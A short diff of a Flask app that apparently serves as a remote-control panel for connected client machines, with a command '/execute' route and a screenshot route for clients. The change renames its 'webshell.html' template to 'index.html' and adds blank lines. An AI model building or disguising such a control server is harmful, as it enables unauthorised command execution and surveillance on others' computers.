@@ -36,7 +36,7 @@ def list_clients():
 
 @app.route('/')
 def index():
-    return render_template('webshell.html')  # 返回 HTML 页面
+    return render_template('index.html')  # 返回 HTML 页面
 
 @app.route('/execute', methods=['GET'])
 def execute_command():
@@ -111,6 +111,21 @@ def screenshot():
             return jsonify({'error': '指定客户端未连接'}), 400
     else:
         return jsonify({'error': '客户端未提供'}), 400
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 if __name__ == "__main__":
     threading.Thread(target=accept_client, daemon=True).start()
